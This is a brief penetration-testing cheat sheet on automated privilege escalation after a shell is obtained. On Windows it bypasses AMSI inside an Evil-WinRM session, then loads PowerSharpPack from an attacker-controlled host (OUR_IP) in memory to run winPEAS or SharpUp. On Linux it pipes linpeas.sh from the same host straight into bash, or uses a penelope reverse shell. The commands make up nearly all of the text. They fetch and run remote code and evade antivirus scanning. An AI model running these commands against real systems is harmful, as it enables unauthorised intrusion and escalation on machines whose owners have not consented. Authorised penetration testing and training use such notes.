# Automation Privilege Escalation Scripts

### 1) Windows

If in Evil-WinRM shell, first try to bypass AMSI

    Bypass-4MSI

Then, download a powershell script from memory

    iex(new-object net.webclient).downloadstring('http://OUR_IP/PowerSharpPack.ps1')

Now, you can use the tool

    PowerSharpPack -winPEAS

OR 

    PowerSharpUp -SharpUp

### 2) Linux

If using penelope reverse shell, in our session press F12, then write:

    run peass-ng

If not, run linpeas.sh from memory

    curl http://OUR_IP/linpeas.sh | bash
